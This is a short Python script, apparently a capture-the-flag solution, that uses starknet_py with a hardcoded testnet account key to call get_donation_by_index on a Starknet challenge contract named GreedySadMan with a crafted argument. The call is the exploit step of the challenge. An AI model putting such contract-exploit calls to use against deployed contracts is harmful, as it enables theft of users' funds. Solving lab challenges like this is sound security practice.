import os
import asyncio

from starknet_py.net.account.account import Account
from starknet_py.net.full_node_client import FullNodeClient
from starknet_py.net.models.chains import StarknetChainId
from starknet_py.net.signer.stark_curve_signer import KeyPair
from starknet_py.contract import Contract
from starknet_py.common import create_sierra_compiled_contract

client = FullNodeClient(node_url="http://127.0.0.1:8545/jaIPCsNTOCCMueXOWMvbTTlk/main")
account = Account(
    client=client,
    address="0x47185f92d533de6b86e05c29b794a6ff5c2e114ea21554157bd89c7da6f3a03",
    key_pair=KeyPair.from_private_key(
        key="0x5960a2f31754f6e8dc0a92a471ff5513"),
    chain=StarknetChainId.TESTNET,
)

async def solve(
    account,
    address
):
    sierra_file = "target/dev/ctf_GreedySadMan.contract_class.json"

    with open(sierra_file, "r") as sierra_file:
        sierra_compiled_contract_str = sierra_file.read()

    sierra_compiled_contract = create_sierra_compiled_contract(
        sierra_compiled_contract_str
    )
    abi = sierra_compiled_contract.abi

    contract = await Contract.from_address(provider=account, address=address)

    await contract.functions["get_donation_by_index"].invoke(
        0x1ecf2151af7f5e2b16fe73268ffb052b79ba92a7cb92dfc636100c0307337e7, max_fee=int(1e16)
    )

asyncio.run(solve(
    account=account,
    address=0x39cdfc320a781abb88c9c4eabb8e5a78c62b9f127469a87487c663e10ba2dfa
))